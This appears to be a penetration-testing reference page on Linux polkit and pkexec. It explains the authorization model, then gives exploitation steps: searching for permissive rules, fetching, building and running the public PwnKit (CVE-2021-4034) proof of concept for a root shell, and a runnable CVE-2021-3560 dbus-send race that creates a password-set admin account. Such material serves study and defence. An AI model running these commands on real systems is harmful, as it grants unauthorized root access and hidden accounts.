# Polkit (PolicyKit)

## Table of Contents

1. [Overview](#overview)
2. [How Polkit Works](#how-polkit-works)
3. [Exploitation](#exploitation)
   - [Misconfigured Rules](#misconfigured-rules)
   - [Known CVEs](#known-cves)

---

## Overview

Polkit (formerly PolicyKit) is an authorization framework used on Linux to manage **privileges for unprivileged processes**. When a non-root application needs to perform a privileged action (install a package, mount a disk, change system settings), it asks polkit whether the user is allowed to do it.

`pkexec` is polkit's command-line tool, equivalent to `sudo` but using polkit policies instead of `/etc/sudoers`. It is **SUID root** and installed by default on almost every Linux distribution.

```bash
ls -la /usr/bin/pkexec
# -rwsr-xr-x 1 root root ... /usr/bin/pkexec

# Run a command as root through polkit
pkexec /usr/bin/some-command
```

## How Polkit Works

```
User action (e.g., click "Install" in GUI)
    → Application asks polkit via D-Bus
        → Polkit checks policy rules
            → Prompts for password if needed
                → Grants or denies the action
```

Policy rules are defined in:
- `/usr/share/polkit-1/actions/` — action definitions (XML)
- `/etc/polkit-1/localauthority/` — local overrides
- `/usr/share/polkit-1/rules.d/` — JavaScript rules (newer versions)

```bash
# List polkit actions
pkaction

# Check a specific action's policy
pkaction --verbose --action-id org.freedesktop.policykit.exec
```

Each action defines who is authorized and under what conditions (password required, active session only, etc.).

## Exploitation

### Misconfigured Rules

If polkit rules are too permissive, unprivileged users can perform privileged actions without authentication:

```bash
# Check if pkexec allows running commands without password
pkexec --help
pkexec /bin/bash

# Look for overly permissive rules
find /usr/share/polkit-1/ /etc/polkit-1/ -name "*.rules" -o -name "*.pkla" 2>/dev/null | xargs grep -l "allow_any\|allow_inactive\|allow_active" 2>/dev/null
```

Look for rules where `allow_active` or `allow_any` is set to `yes` without authentication:

```xml
<!-- Dangerous: allows any active user without password -->
<defaults>
  <allow_active>yes</allow_active>
</defaults>
```

### Known CVEs

#### CVE-2021-4034 — PwnKit

Memory corruption in `pkexec`, present since **May 2009**. Affects virtually every Linux distribution.

When `pkexec` is called with `argc = 0` (no arguments), it reads out of bounds from `argv`, which overlaps with `envp` (environment variables). This allows injecting `GCONV_PATH` to load a malicious shared library as root.

**Why it's significant:**
- Present on nearly every Linux system since 2009
- Extremely reliable — no race condition, no brute force
- Works as any unprivileged user

```bash
# Check if vulnerable
dpkg -l policykit-1 2>/dev/null || rpm -qa polkit 2>/dev/null
# Fixed in: Ubuntu 0.105-26ubuntu1.2, Debian 0.105-31+deb11u1, RHEL 0.112-26.el7_9.1
```

**Exploitation:**

```bash
# Using public PoC (C version)
git clone https://github.com/berdav/CVE-2021-4034
cd CVE-2021-4034
make
./cve-2021-4034
# root shell
```

#### CVE-2021-3560

Race condition in polkit's D-Bus handling. By sending a D-Bus request and killing it mid-flight (before polkit finishes authentication), polkit may authorize the request without a password.

Affected: polkit 0.113 — 0.118 (RHEL 8, Ubuntu 20.04, Fedora 21+)

```bash
# Create a new admin user without authentication
dbus-send --system --dest=org.freedesktop.Accounts \
  --type=method_call --print-reply /org/freedesktop/Accounts \
  org.freedesktop.Accounts.CreateUser \
  string:hacker string:"Hacker" int32:1 & sleep 0.005s; kill $!

# Set a password for the new user
dbus-send --system --dest=org.freedesktop.Accounts \
  --type=method_call --print-reply /org/freedesktop/Accounts/User1002 \
  org.freedesktop.Accounts.User.SetPassword \
  string:'$6$salt$hash' string:hacker & sleep 0.005s; kill $!
```

> **Note:** The timing (`sleep 0.005s`) needs to be adjusted per system. May require multiple attempts.
